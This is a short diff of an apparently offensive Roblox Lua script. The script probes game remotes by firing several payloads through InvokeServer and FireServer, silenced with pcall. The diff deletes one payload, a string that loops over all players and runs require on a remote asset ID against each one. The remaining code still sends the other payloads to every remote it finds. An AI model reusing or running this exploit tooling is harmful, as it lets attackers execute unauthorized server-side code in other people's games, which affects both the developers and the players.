@@ -1787,11 +1787,7 @@ local function C_f()
 
 
 
-		local name = [[
-		for _, lol in pairs(game.Players:GetPlayers()) do
-			require(127069679415069)(lol.Name)
-	    end
-		]]
+		
 
 		pcall(function()
 			if isFunction then
@@ -1800,14 +1796,14 @@ local function C_f()
 					pcall(function() remote:InvokeServer("moonTSS", payload) end)
 					pcall(function() remote:InvokeServer(RE) end)
 					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
-					pcall(function() remote:InvokeServer(name) end)
+				
 				end)
 			else
 				pcall(function() remote:FireServer(payload) end)
 				pcall(function() remote:FireServer("moonTSS", payload) end)
 				pcall(function() remote:FireServer(RE) end)
 				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
-				pcall(function() remote:FireServer(name) end)
+
 			end
 		end)
 
